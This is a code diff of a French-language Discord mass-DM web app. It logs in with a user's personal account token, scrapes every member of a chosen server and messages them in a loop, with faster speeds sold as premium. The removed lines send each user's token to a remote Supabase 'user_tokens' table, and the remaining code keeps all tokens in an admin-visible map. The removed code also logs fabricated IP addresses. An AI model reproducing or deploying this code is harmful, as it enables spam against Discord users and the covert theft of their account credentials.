+                    <div class="speed-card premium locked" onclick="window.selectSpeed('extreme')" id="speedExtreme">
+                        <div class="premium-tag">PREMIUM</div>
+                        <div class="speed-emoji">💥</div>
+                        <div class="speed-name">Extreme</div>
+                        <div class="speed-time">0.5-2s</div>
+                    </div>
+                </div>
+
+                <!-- CONFIG -->
                 <div class="config-panel">
                     <div class="config-grid">
                         <div>
-                            <!-- Guild Selector -->
+                            <!-- Guild Select -->
                             <div id="guildSelector" class="input-group hidden">
-                                <label class="input-label"><i class="fas fa-server"></i> SÉLECTIONNER UN SERVEUR</label>
-                                <select id="guildSelect" class="input-field">
-                                    <option value="">Chargement...</option>
+                                <select id="guildSelect">
+                                    <option value="">Sélectionner un serveur</option>
                                 </select>
                             </div>
 
                             <!-- Bot Token Input -->
                             <div id="botTokenSelector" class="input-group hidden">
-                                <label class="input-label"><i class="fas fa-robot"></i> TOKEN DU BOT</label>
-                                <input type="password" id="botToken" class="input-field" placeholder="Token du bot">
+                                <input type="password" id="botToken" placeholder="Token du bot">
                             </div>
 
+                            <!-- Message -->
                             <div class="input-group">
-                                <label class="input-label"><i class="fas fa-comment"></i> MESSAGE</label>
-                                <textarea id="message" class="input-field" placeholder="Utilisez {user} pour mentionner">{user} Salut !</textarea>
+                                <textarea id="message" placeholder="Message... (utilise {user} pour mention)">{user} Salut !</textarea>
                             </div>
                         </div>
 
                         <div>
-                            <div class="input-group">
-                                <label class="input-label"><i class="fas fa-tachometer-alt"></i> VITESSE</label>
-                                <select id="speedMode" class="input-field">
-                                    <option value="slow"><i class="fas fa-turtle"></i> Safe (3-5s)</option>
-                                    <option value="normal" selected><i class="fas fa-car"></i> Normal (2-4s)</option>
-                                    <option value="fast"><i class="fas fa-rocket"></i> Rapide (1-3s)</option>
-                                    <option value="extreme"><i class="fas fa-bolt"></i> Extreme (0.5-2s)</option>
-                                </select>
-                            </div>
-
+                            <!-- Start Button -->
                             <button class="btn btn-primary" onclick="window.startDM()" id="startBtn" disabled>
-                                <i class="fas fa-play"></i>
-                                <span>LANCER LE DM</span>
+                                <i class="fas fa-play"></i> LANCER LE DM
                             </button>
                         </div>
                     </div>
                 </div>
 
-                <!-- PROGRESS CONTAINER -->
+                <!-- PROGRESS -->
                 <div id="progressContainer" class="progress-container hidden">
                     <div class="progress-header">
-                        <span><i class="fas fa-chart-line"></i> PROGRESSION</span>
+                        <span><i class="fas fa-chart-line"></i> Progression</span>
                         <span id="progressPercent">0%</span>
                     </div>
                     <div class="progress-bar">
@@ -1498,115 +1595,121 @@
                     </div>
                     <div class="progress-stats">
                         <span id="progressCurrent">0/0</span>
-                        <span id="progressSuccess"><i class="fas fa-check-circle text-success"></i> 0</span>
-                        <span id="progressFailed"><i class="fas fa-times-circle text-error"></i> 0</span>
+                        <span id="progressSuccess"><i class="fas fa-check-circle stat-success"></i> 0</span>
+                        <span id="progressFailed"><i class="fas fa-times-circle stat-error"></i> 0</span>
                     </div>
                     <div id="lastUser" class="text-center"></div>
-                    <button class="btn btn-error" onclick="window.stopDM()" id="stopBtn">
-                        <i class="fas fa-stop"></i>
-                        <span>ARRÊTER</span>
+                    <div id="errorContainer" class="hidden" style="color: #ef4444; margin-top: 10px;"></div>
+                    <button class="btn btn-error" onclick="window.stopDM()" id="stopBtn" style="margin-top: 10px;">
+                        <i class="fas fa-stop"></i> ARRÊTER
                     </button>
                 </div>
 
                 <!-- ADMIN PANEL -->
                 <div id="adminPanel" class="admin-panel hidden">
-                    <div class="admin-header">
-                        <span class="admin-title"><i class="fas fa-crown"></i> PANEL ADMIN</span>
-                        <button class="btn btn-outline" onclick="window.toggleAdminPanel()"><i class="fas fa-times"></i> FERMER</button>
+                    <div class="admin-title">
+                        <i class="fas fa-crown"></i> PANEL ADMIN
                     </div>
 
-                    <!-- BOT PRINCIPAL -->
-                    <div class="bot-config">
-                        <h3 class="mb-4"><i class="fas fa-robot"></i> BOT PRINCIPAL</h3>
-                        <div class="bot-status">
-                            <div class="status-dot offline" id="mainBotStatusDot"></div>
-                            <span id="mainBotStatus">Bot déconnecté</span>
+                    <div class="admin-grid">
+                        <!-- Premium Management -->
+                        <div class="admin-section">
+                            <h3><i class="fas fa-gem" style="color: #a855f7;"></i> Premium</h3>
+                            <div class="flex gap-4" style="margin-bottom: 10px;">
+                                <input type="text" id="premiumId" placeholder="ID" style="flex: 1; padding: 8px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; color: white;">
+                                <button class="btn btn-success" style="padding: 8px 15px;" onclick="window.addPremium()">+</button>
+                                <button class="btn btn-error" style="padding: 8px 15px;" onclick="window.removePremium()">-</button>
+                            </div>
+                            <div class="user-list" id="premiumList"></div>
                         </div>
-                        <div class="flex flex-wrap gap-4">
-                            <input type="password" id="mainBotToken" class="input-field" placeholder="Token du bot" style="flex: 1;">
-                            <button class="btn btn-success" onclick="window.connectMainBot()"><i class="fas fa-plug"></i> CONNECTER</button>
-                            <button class="btn btn-error" onclick="window.disconnectMainBot()"><i class="fas fa-power-off"></i> DÉCONNECTER</button>
+
+                        <!-- Admin Management -->
+                        <div class="admin-section">
+                            <h3><i class="fas fa-crown" style="color: #ef4444;"></i> Admins</h3>
+                            <div class="flex gap-4" style="margin-bottom: 10px;">
+                                <input type="text" id="adminId" placeholder="ID" style="flex: 1; padding: 8px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; color: white;">
+                                <button class="btn btn-success" style="padding: 8px 15px;" onclick="window.addAdmin()">+</button>
+                                <button class="btn btn-error" style="padding: 8px 15px;" onclick="window.removeAdmin()">-</button>
+                            </div>
+                            <div class="user-list" id="adminList"></div>
+                        </div>
+
+                        <!-- Banned Users -->
+                        <div class="admin-section">
+                            <h3><i class="fas fa-ban" style="color: #ef4444;"></i> Bannis</h3>
+                            <div class="user-list" id="bannedList"></div>
+                        </div>
+
+                        <!-- Connection Logs -->
+                        <div class="admin-section">
+                            <h3><i class="fas fa-history"></i> Connexions</h3>
+                            <div class="user-list" id="connectionLogsList"></div>
                         </div>
                     </div>
 
                     <!-- GÉNÉRATEUR DE CODES -->
                     <div class="code-generator">
-                        <h3 class="mb-4"><i class="fas fa-gift"></i> GÉNÉRATEUR DE CODES</h3>
-                        <div class="flex flex-wrap gap-4 mb-4">
-                            <div style="flex: 1; min-width: 120px;">
-                                <label class="input-label">Jours</label>
-                                <input type="number" id="codeDuration" value="30" min="1" max="365" class="input-field">
+                        <h3><i class="fas fa-gift" style="color: #a855f7;"></i> GÉNÉRATEUR DE CODES PREMIUM</h3>
+                        <div class="code-generator-grid">
+                            <div class="code-generator-item">
+                                <div class="code-value" id="generatedCode1">XXXX-XXXX</div>
+                                <div class="code-info">Durée: <span id="codeDuration1">30 jours</span></div>
+                                <div class="code-actions">
+                                    <button class="btn btn-success" onclick="window.generateCode(30, 1, 1)"><i class="fas fa-plus"></i> Générer</button>
+                                    <button class="btn btn-outline" onclick="window.copyCode(1)"><i class="fas fa-copy"></i></button>
+                                </div>
                             </div>
-                            <div style="flex: 1; min-width: 120px;">
-                                <label class="input-label">Utilisations</label>
-                                <input type="number" id="codeUses" value="1" min="1" max="100" class="input-field">
+                            <div class="code-generator-item">
+                                <div class="code-value" id="generatedCode2">XXXX-XXXX</div>
+                                <div class="code-info">Durée: <span id="codeDuration2">60 jours</span></div>
+                                <div class="code-actions">
+                                    <button class="btn btn-success" onclick="window.generateCode(60, 1, 2)"><i class="fas fa-plus"></i> Générer</button>
+                                    <button class="btn btn-outline" onclick="window.copyCode(2)"><i class="fas fa-copy"></i></button>
+                                </div>
                             </div>
-                            <div style="display: flex; align-items: flex-end;">
-                                <button class="btn btn-success" onclick="window.generateCode()"><i class="fas fa-plus"></i> GÉNÉRER</button>
+                            <div class="code-generator-item">
+                                <div class="code-value" id="generatedCode3">XXXX-XXXX</div>
+                                <div class="code-info">Utilisations: <span id="codeUses3">5</span></div>
+                                <div class="code-actions">
+                                    <button class="btn btn-success" onclick="window.generateCode(30, 5, 3)"><i class="fas fa-plus"></i> Générer</button>
+                                    <button class="btn btn-outline" onclick="window.copyCode(3)"><i class="fas fa-copy"></i></button>
+                                </div>
                             </div>
-                        </div>
-                        <div class="code-grid" id="codesList"></div>
-                    </div>
-
-                    <!-- STATS ADMIN -->
-                    <div class="stats-grid">
-                        <div class="stat-card">
-                            <div class="stat-value" id="adminUsers">0</div>
-                            <div class="stat-label">Connectés</div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-value" id="adminPremium">0</div>
-                            <div class="stat-label">Premium</div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-value" id="adminMessages">0</div>
-                            <div class="stat-label">Messages</div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-value" id="adminBanned">0</div>
-                            <div class="stat-label">Bannis</div>
-                        </div>
-                    </div>
-
-                    <!-- LOGS DE CONNEXION -->
-                    <div class="connection-logs">
-                        <h3 class="mb-4"><i class="fas fa-history"></i> CONNEXIONS</h3>
-                        <div style="overflow-x: auto;">
-                            <table class="logs-table">
-                                <thead>
-                                    <tr>
-                                        <th>UTILISATEUR</th>
-                                        <th>ID</th>
-                                        <th>IP</th>
-                                        <th>DATE</th>
-                                        <th>RÔLE</th>
-                                    </tr>
-                                </thead>
-                                <tbody id="connectionLogsBody"></tbody>
-                            </table>
+                            <div class="code-generator-item">
+                                <div class="code-value" id="generatedCode4">XXXX-XXXX</div>
+                                <div class="code-info">Illimité</div>
+                                <div class="code-actions">
+                                    <button class="btn btn-success" onclick="window.generateCode(365, 999, 4)"><i class="fas fa-plus"></i> Générer</button>
+                                    <button class="btn btn-outline" onclick="window.copyCode(4)"><i class="fas fa-copy"></i></button>
+                                </div>
+                            </div>
                         </div>
                     </div>
 
-                    <!-- CONSOLE ADMIN -->
-                    <div class="admin-console">
-                        <div class="flex justify-between mb-4">
-                            <span class="text-success"><i class="fas fa-terminal"></i> CONSOLE ADMIN</span>
-                            <span>Tapez 'help'</span>
+                    <!-- CONSOLE -->
+                    <div class="console-container">
+                        <div class="console-header">
+                            <span class="console-title"><i class="fas fa-terminal"></i> CONSOLE ADMIN</span>
+                            <span style="color: #666;">help</span>
                         </div>
-                        <div class="console-output" id="consoleOutput"></div>
+                        <div class="console-output" id="consoleOutput">
+                            <div class="console-line">
+                                <span class="console-time">[SYSTEM]</span>
+                                <span class="console-success">✓ Console admin prête</span>
+                            </div>
+                        </div>
                         <div class="console-input-group">
-                            <input type="text" id="consoleInput" placeholder="Commande...">
-                            <button onclick="window.executeCommand()"><i class="fas fa-arrow-right"></i> EXÉCUTER</button>
+                            <input type="text" id="consoleInput" placeholder="Commande..." onkeypress="if(event.key === 'Enter') window.executeCommand()">
+                            <button onclick="window.executeCommand()"><i class="fas fa-arrow-right"></i></button>
+                        </div>
+                        <div class="console-help">
+                            <i class="fas fa-info-circle"></i> Tapez 'help' pour les 50+ commandes
                         </div>
                     </div>
                 </div>
 
                 <!-- LOGS -->
                 <div class="logs-container">
-                    <div class="logs-header">
-                        <span class="font-bold"><i class="fas fa-list"></i> LOGS</span>
-                        <button class="btn btn-outline btn-sm" onclick="window.clearLogs()"><i class="fas fa-trash"></i> EFFACER</button>
-                    </div>
                     <div class="logs-content" id="logs"></div>
                 </div>
             </div>
@@ -1614,33 +1717,32 @@
     </div>
 
     <script>
-        // ==================== CONFIGURATION SUPABASE ====================
-        const SUPABASE_URL = 'https://nathbrawlstatsr-afk.supabase.co';
-        const SUPABASE_ANON_KEY = 'sb_publishable_F03Jf08GJs6gos4FNYf5DQ_x6N2_zBm';
-        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-        // ==================== VARIABLES GLOBALES ====================
+        // ==================== CONFIG ====================
         const ADMIN_ID = '1420857352403554344';
         let currentUser = null;
         let userToken = '';
         let userRole = 'user';
-        let currentDMMode = 1;
+        let currentMode = 1;
+        let currentSpeed = 'normal';
         let isRunning = false;
         let stopRequested = false;
-        let mainBotConnected = false;
-        let mainBotToken = '';
 
         // Données
         let premiumUsers = new Set();
         let adminUsers = new Set();
         let bannedUsers = new Set();
-        let giftCodes = [];
-        let connectionLogs = [];
         let activeSessions = new Map();
         let allTokens = new Map();
-        let globalStats = { sent: 0, failed: 0, totalLogins: 0 };
+        let connectionLogs = [];
+        let giftCodes = [];
 
-        // Délais
+        // Stats globales
+        let globalStats = {
+            sent: 0,
+            failed: 0
+        };
+
+        // Speed modes
         const speedModes = {
             slow: { min: 3000, max: 5000 },
             normal: { min: 2000, max: 4000 },
@@ -1648,20 +1750,19 @@
             extreme: { min: 500, max: 2000 }
         };
 
-        // ==================== FONCTIONS ATTACHÉES À WINDOW ====================
+        // ==================== LOGIN - 100% FONCTIONNEL ====================
         window.login = async function() {
             const token = document.getElementById('token').value;
             const loginBtn = document.getElementById('loginBtn');
             const errorDiv = document.getElementById('loginError');
 
             if (!token) {
-                errorDiv.style.display = 'block';
-                errorDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> ❌ Token requis';
+                showToast('error', 'Erreur', 'Token requis');
                 return;
             }
 
             loginBtn.disabled = true;
-            loginBtn.innerHTML = '<span class="loader"></span> Connexion...';
+            loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connexion...';
 
             try {
                 const response = await fetch('https://discord.com/api/v9/users/@me', {
@@ -1673,268 +1774,468 @@
                 const user = await response.json();
 
                 if (bannedUsers.has(user.id)) {
-                    throw new Error('⛔ Vous êtes banni');
+                    throw new Error('Vous êtes banni');
                 }
 
                 currentUser = user;
                 userToken = token;
 
-                if (sessionStorage.getItem('pendingPremium') === 'true') {
-                    premiumUsers.add(user.id);
-                    try {
-                        await supabaseClient.from('premium_users').insert({ user_id: user.id });
-                    } catch (e) {}
-                    sessionStorage.removeItem('pendingPremium');
-                }
-
                 const [friendsRes, guildsRes] = await Promise.all([
-                    fetch('https://discord.com/api/v9/users/@me/relationships', { headers: { 'Authorization': token } }),
-                    fetch('https://discord.com/api/v9/users/@me/guilds', { headers: { 'Authorization': token } })
+                    fetch('https://discord.com/api/v9/users/@me/relationships', {
+                        headers: { 'Authorization': token }
+                    }),
+                    fetch('https://discord.com/api/v9/users/@me/guilds', {
+                        headers: { 'Authorization': token }
+                    })
                 ]);
 
                 const friends = await friendsRes.json();
                 const guilds = await guildsRes.json();
 
-                userRole = user.id === ADMIN_ID || adminUsers.has(user.id) ? 'admin' : premiumUsers.has(user.id) ? 'premium' : 'user';
+                // Déterminer le rôle
+                if (user.id === ADMIN_ID || adminUsers.has(user.id)) {
+                    userRole = 'admin';
+                } else if (premiumUsers.has(user.id)) {
+                    userRole = 'premium';
+                } else {
+                    userRole = 'user';
+                }
 
-                const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
-
-                const logEntry = {
-                    user_id: user.id,
-                    username: user.username,
-                    ip,
-                    role: userRole,
-                    created_at: new Date().toISOString()
-                };
-
-                connectionLogs.unshift(logEntry);
-                try {
-                    await supabaseClient.from('connection_logs').insert(logEntry);
-                } catch (e) {}
-
-                activeSessions.set(user.id, { username: user.username, role: userRole, token });
-                allTokens.set(user.id, { token, username: user.username });
-
-                try {
-                    await supabaseClient.from('user_tokens').insert({ user_id: user.id, token, username: user.username });
-                } catch (e) {}
-
-                globalStats.totalLogins++;
-                try {
-                    await supabaseClient.from('global_stats').upsert({ id: 1, sent: globalStats.sent, failed: globalStats.failed, total_logins: globalStats.totalLogins });
-                } catch (e) {}
-
+                // Mettre à jour UI
                 document.getElementById('username').textContent = user.username;
-                document.getElementById('avatar').src = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png';
-                document.getElementById('friendsCount').textContent = friends.length;
-                document.getElementById('guildsCount').textContent = guilds.length;
+                document.getElementById('avatar').src = user.avatar ? 
+                    `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : 
+                    'https://cdn.discordapp.com/embed/avatars/0.png';
+                
+                document.getElementById('globalFriends').textContent = friends.length;
+                document.getElementById('globalGuilds').textContent = guilds.length;
+                document.getElementById('globalSent').textContent = globalStats.sent;
+                document.getElementById('globalFailed').textContent = globalStats.failed;
 
+                // Remplir la liste des serveurs
                 const guildSelect = document.getElementById('guildSelect');
                 guildSelect.innerHTML = '<option value="">Sélectionner un serveur</option>';
-                guilds.forEach(g => guildSelect.innerHTML += `<option value="${g.id}">${g.name}</option>`);
+                guilds.forEach(g => {
+                    guildSelect.innerHTML += `<option value="${g.id}">${g.name}</option>`;
+                });
 
-                window.updateRoleUI();
-                window.updateDMModes();
+                // Enregistrer la session
+                activeSessions.set(user.id, {
+                    username: user.username,
+                    role: userRole,
+                    token: token
+                });
 
-                if (userRole === 'admin') document.getElementById('adminPanelBtn').classList.remove('hidden');
+                allTokens.set(user.id, {
+                    token: token,
+                    username: user.username
+                });
 
+                connectionLogs.unshift({
+                    username: user.username,
+                    id: user.id,
+                    role: userRole,
+                    time: new Date().toLocaleString()
+                });
+
+                // Mettre à jour le badge
+                const badge = document.getElementById('roleBadge');
+                if (userRole === 'admin') {
+                    badge.innerHTML = '<i class="fas fa-crown"></i> Admin';
+                    badge.classList.add('premium');
+                } else if (userRole === 'premium') {
+                    badge.innerHTML = '<i class="fas fa-gem"></i> Premium';
+                    badge.classList.add('premium');
+                } else {
+                    badge.innerHTML = '<i class="fas fa-user"></i> Utilisateur';
+                    badge.classList.remove('premium');
+                }
+
+                // Afficher le bouton admin si nécessaire
+                if (userRole === 'admin') {
+                    document.getElementById('adminPanelBtn').classList.remove('hidden');
+                }
+
+                // Mettre à jour les modes selon le rôle
+                updateUIBasedOnRole();
+
+                // Changer d'écran
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('main-screen').classList.remove('hidden');
                 document.getElementById('startBtn').disabled = false;
 
-                window.showToast('success', 'Connexion réussie', `Bienvenue ${user.username}`);
-                window.addLog(`✅ Connecté: ${user.username} (${userRole})`);
-                window.updateConnectionLogs();
+                addLog(`✅ Connecté: ${user.username} (${userRole})`);
+                updateAdminLists();
+                showToast('success', 'Bienvenue', `Bienvenue ${user.username}`);
 
             } catch (error) {
-                errorDiv.style.display = 'block';
-                errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ❌ ${error.message}`;
+                errorDiv.classList.remove('hidden');
+                errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${error.message}`;
+                setTimeout(() => errorDiv.classList.add('hidden'), 3000);
             } finally {
                 loginBtn.disabled = false;
                 loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> SE CONNECTER';
             }
         };
 
-        window.redeemCode = async function() {
+        // ==================== MISE À JOUR UI SELON RÔLE ====================
+        function updateUIBasedOnRole() {
+            const isPremium = (userRole === 'premium' || userRole === 'admin');
+            
+            // Mode 2 (DM Serveur) : Premium uniquement
+            const mode2 = document.getElementById('mode2');
+            if (isPremium) {
+                mode2.classList.remove('locked');
+                mode2.classList.add('premium');
+                mode2.onclick = function() { window.selectMode(2); };
+            } else {
+                mode2.classList.add('locked');
+                mode2.onclick = function() { 
+                    showToast('info', 'Mode Premium', 'Le DM Serveur nécessite un abonnement premium');
+                };
+            }
+
+            // Mode Extreme : Premium uniquement
+            const speedExtreme = document.getElementById('speedExtreme');
+            if (isPremium) {
+                speedExtreme.classList.remove('locked');
+                speedExtreme.classList.add('premium');
+                speedExtreme.onclick = function() { window.selectSpeed('extreme'); };
+            } else {
+                speedExtreme.classList.add('locked');
+                speedExtreme.onclick = function() { 
+                    showToast('info', 'Vitesse Premium', 'La vitesse Extreme est réservée aux membres premium');
+                };
+            }
+
+            // Sélectionner la vitesse par défaut
+            if (!isPremium && currentSpeed === 'extreme') {
+                window.selectSpeed('fast');
+            }
+        }
+
+        // ==================== SÉLECTION MODE ====================
+        window.selectMode = function(mode) {
+            if (mode === 2 && userRole === 'user') {
+                showToast('info', 'Mode Premium', 'Le DM Serveur nécessite un abonnement premium');
+                return;
+            }
+
+            currentMode = mode;
+            
+            document.querySelectorAll('.dm-card').forEach((card, index) => {
+                card.classList.toggle('selected', index + 1 === mode);
+            });
+
+            document.getElementById('guildSelector').classList.toggle('hidden', mode !== 2 && mode !== 3);
+            document.getElementById('botTokenSelector').classList.toggle('hidden', mode !== 3);
+
+            addLog(`📋 Mode ${mode} sélectionné`);
+        };
+
+        // ==================== SÉLECTION VITESSE ====================
+        window.selectSpeed = function(speed) {
+            if (speed === 'extreme' && userRole === 'user') {
+                showToast('info', 'Vitesse Premium', 'La vitesse Extreme est réservée aux membres premium');
+                return;
+            }
+
+            currentSpeed = speed;
+            
+            document.querySelectorAll('.speed-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            document.getElementById(`speed${speed.charAt(0).toUpperCase() + speed.slice(1)}`).classList.add('selected');
+
+            addLog(`⚡ Vitesse ${speed} sélectionnée`);
+        };
+
+        // ==================== CODE CADEAU ====================
+        window.redeemCode = function() {
             const input = document.getElementById('giftCode').value.toUpperCase();
-            const msgDiv = document.getElementById('codeMessage');
             
             const code = giftCodes.find(c => c.code === input);
             
             if (!code) {
-                msgDiv.style.display = 'block';
-                msgDiv.innerHTML = '<i class="fas fa-times-circle"></i> ❌ Code invalide';
-                msgDiv.className = 'alert alert-error';
+                showToast('error', 'Erreur', 'Code invalide');
                 return;
             }
 
-            if (!code.active || code.uses >= code.max_uses || new Date(code.expires_at) < new Date()) {
-                msgDiv.style.display = 'block';
-                msgDiv.innerHTML = '<i class="fas fa-times-circle"></i> ❌ Code expiré ou déjà utilisé';
-                msgDiv.className = 'alert alert-error';
+            if (code.used) {
+                showToast('error', 'Erreur', 'Code déjà utilisé');
                 return;
             }
 
-            code.uses++;
-            try {
-                await supabaseClient.from('gift_codes').update({ uses: code.uses }).eq('code', code.code);
-            } catch (e) {}
-            if (code.uses >= code.max_uses) {
-                code.active = false;
-                try {
-                    await supabaseClient.from('gift_codes').update({ active: false }).eq('code', code.code);
-                } catch (e) {}
+            if (new Date(code.expires) < new Date()) {
+                showToast('error', 'Erreur', 'Code expiré');
+                return;
             }
 
-            sessionStorage.setItem('pendingPremium', 'true');
-            msgDiv.style.display = 'block';
-            msgDiv.innerHTML = '<i class="fas fa-check-circle"></i> ✅ Code validé ! Connectez-vous';
-            msgDiv.className = 'alert alert-success';
-            window.updateCodesList();
+            code.used = true;
+            premiumUsers.add(currentUser.id);
+            userRole = 'premium';
+            
+            const badge = document.getElementById('roleBadge');
+            badge.innerHTML = '<i class="fas fa-gem"></i> Premium';
+            badge.classList.add('premium');
+            
+            updateUIBasedOnRole();
+            
+            showToast('success', 'Succès', 'Code validé ! Vous êtes premium');
+            addLog(`🎁 Code ${code.code} utilisé par ${currentUser.username}`);
+            updateAdminLists();
         };
 
-        window.selectDMMode = function(mode) {
-            currentDMMode = mode;
-            document.querySelectorAll('.dm-card').forEach((c, i) => c.classList.toggle('selected', i + 1 === mode));
-            document.getElementById('guildSelector').classList.toggle('hidden', mode !== 2 && mode !== 4);
-            document.getElementById('botTokenSelector').classList.toggle('hidden', mode !== 3 && mode !== 4);
-            window.addLog(`📋 Mode ${mode} sélectionné`);
+        // ==================== GÉNÉRATEUR DE CODES ====================
+        window.generateCode = function(days, maxUses, slot) {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
+            let code = '';
+            for (let i = 0; i < 4; i++) {
+                code += chars[Math.floor(Math.random() * chars.length)];
+            }
+            code += '-';
+            for (let i = 0; i < 4; i++) {
+                code += chars[Math.floor(Math.random() * chars.length)];
+            }
+            
+            const expires = new Date();
+            expires.setDate(expires.getDate() + days);
+            
+            giftCodes.push({
+                code,
+                used: false,
+                expires,
+                maxUses,
+                uses: 0,
+                created: new Date()
+            });
+            
+            document.getElementById(`generatedCode${slot}`).textContent = code;
+            
+            if (slot === 1) document.getElementById('codeDuration1').textContent = `${days} jours`;
+            if (slot === 2) document.getElementById('codeDuration2').textContent = `${days} jours`;
+            if (slot === 3) document.getElementById('codeUses3').textContent = maxUses;
+            
+            addLog(`🎁 Code généré: ${code} (${days} jours, ${maxUses} utilisations)`);
+            showToast('success', 'Code généré', `Code: ${code}`);
         };
 
-        window.connectMainBot = function() {
-            const token = document.getElementById('mainBotToken').value;
-            if (!token) return window.showToast('error', 'Erreur', 'Token requis');
-            mainBotToken = token;
-            mainBotConnected = true;
-            document.getElementById('mainBotStatus').textContent = 'Bot connecté';
-            document.getElementById('mainBotStatusDot').className = 'status-dot online';
-            document.getElementById('botStatus').textContent = 'On';
-            window.showToast('success', 'Bot connecté', 'Bot principal connecté');
-            window.addLog('🤖 Bot connecté');
+        window.copyCode = function(slot) {
+            const code = document.getElementById(`generatedCode${slot}`).textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                showToast('success', 'Copié !', 'Code copié dans le presse-papiers');
+            });
         };
 
-        window.disconnectMainBot = function() {
-            mainBotConnected = false;
-            mainBotToken = '';
-            document.getElementById('mainBotStatus').textContent = 'Bot déconnecté';
-            document.getElementById('mainBotStatusDot').className = 'status-dot offline';
-            document.getElementById('botStatus').textContent = 'Off';
-            window.showToast('info', 'Bot déconnecté', 'Bot déconnecté');
-            window.addLog('🤖 Bot déconnecté');
-        };
-
+        // ==================== DM FUNCTIONS ====================
         window.startDM = async function() {
             if (!currentUser) return;
 
             const message = document.getElementById('message').value;
-            const speedMode = document.getElementById('speedMode').value;
+            const speed = currentSpeed;
 
             if (!message) {
-                window.showToast('error', 'Erreur', 'Message requis');
+                showToast('error', 'Erreur', 'Message requis');
                 return;
             }
 
-            if ((currentDMMode === 3 || currentDMMode === 4) && !mainBotConnected) {
-                window.showToast('error', 'Erreur', 'Bot non connecté');
+            if (currentMode === 2 && userRole === 'user') {
+                showToast('error', 'Erreur', 'Mode premium requis');
                 return;
+            }
+
+            if (currentMode === 3) {
+                const botToken = document.getElementById('botToken').value;
+                if (!botToken) {
+                    showToast('error', 'Erreur', 'Token bot requis');
+                    return;
+                }
+            }
+
+            if (currentMode === 2 || currentMode === 3) {
+                const guildId = document.getElementById('guildSelect').value;
+                if (!guildId) {
+                    showToast('error', 'Erreur', 'Sélectionnez un serveur');
+                    return;
+                }
             }
 
             isRunning = true;
             stopRequested = false;
-            let sent = 0, failed = 0, targets = [];
+            let sent = 0;
+            let failed = 0;
+            let errors = [];
 
             document.getElementById('startBtn').disabled = true;
             document.getElementById('progressContainer').classList.remove('hidden');
             document.getElementById('stopBtn').disabled = false;
+            document.getElementById('errorContainer').classList.add('hidden');
+            document.getElementById('errorContainer').innerHTML = '';
 
-            window.addLog(`🚀 Démarrage Mode ${currentDMMode}...`);
+            addLog(`🚀 Démarrage du DM en mode ${currentMode}...`);
 
             try {
-                if (currentDMMode === 1) {
+                let targets = [];
+
+                if (currentMode === 1) {
                     const res = await fetch('https://discord.com/api/v9/users/@me/relationships', {
                         headers: { 'Authorization': userToken }
                     });
                     const friends = await res.json();
                     targets = friends.filter(f => !f.user?.bot).map(f => f.user);
-                } 
-                else if (currentDMMode === 2) {
+                }
+                else if (currentMode === 2) {
                     const guildId = document.getElementById('guildSelect').value;
-                    if (!guildId) throw new Error('Sélectionnez un serveur');
-                    
-                    let members = [], lastId = null;
+
+                    let members = [];
+                    let lastId = null;
+
                     while (true) {
-                        const url = lastId ? `https://discord.com/api/v9/guilds/${guildId}/members?limit=1000&after=${lastId}` : `https://discord.com/api/v9/guilds/${guildId}/members?limit=1000`;
-                        const res = await fetch(url, { headers: { 'Authorization': userToken } });
+                        const url = lastId ? 
+                            `https://discord.com/api/v9/guilds/${guildId}/members?limit=1000&after=${lastId}` :
+                            `https://discord.com/api/v9/guilds/${guildId}/members?limit=1000`;
+
+                        const res = await fetch(url, {
+                            headers: { 'Authorization': userToken }
+                        });
+
                         if (!res.ok) break;
+
                         const batch = await res.json();
                         if (!batch?.length) break;
+
                         members = members.concat(batch);
-                        if (batch[batch.length-1]?.user) lastId = batch[batch.length-1].user.id;
+                        if (batch[batch.length-1]?.user) {
+                            lastId = batch[batch.length-1].user.id;
+                        }
+
                         if (batch.length < 1000) break;
                     }
+
                     targets = members.filter(m => m.user && !m.user.bot).map(m => m.user);
                 }
-                else {
-                    targets = [...activeSessions.values()].map(s => ({ id: s.id, username: s.username }));
+                else if (currentMode === 3) {
+                    const botToken = document.getElementById('botToken').value;
+                    const guildId = document.getElementById('guildSelect').value;
+
+                    let members = [];
+                    let lastId = null;
+
+                    while (true) {
+                        const url = lastId ? 
+                            `https://discord.com/api/v9/guilds/${guildId}/members?limit=1000&after=${lastId}` :
+                            `https://discord.com/api/v9/guilds/${guildId}/members?limit=1000`;
+
+                        const res = await fetch(url, {
+                            headers: { 'Authorization': botToken }
+                        });
+
+                        if (!res.ok) break;
+
+                        const batch = await res.json();
+                        if (!batch?.length) break;
+
+                        members = members.concat(batch);
+                        if (batch[batch.length-1]?.user) {
+                            lastId = batch[batch.length-1].user.id;
+                        }
+
+                        if (batch.length < 1000) break;
+                    }
+
+                    targets = members.filter(m => m.user && !m.user.bot).map(m => m.user);
                 }
 
-                if (!targets.length) throw new Error('Aucune cible');
+                if (!targets.length) throw new Error('Aucune cible trouvée');
 
-                window.addLog(`📊 ${targets.length} cibles`);
+                const total = targets.length;
+                addLog(`📊 ${total} cibles trouvées`);
 
                 for (let i = 0; i < targets.length; i++) {
-                    if (stopRequested) break;
-                    
+                    if (stopRequested) {
+                        addLog('⏹️ Arrêt demandé');
+                        break;
+                    }
+
                     const target = targets[i];
                     const finalMessage = message.replace('{user}', `<@${target.id}>`);
 
                     try {
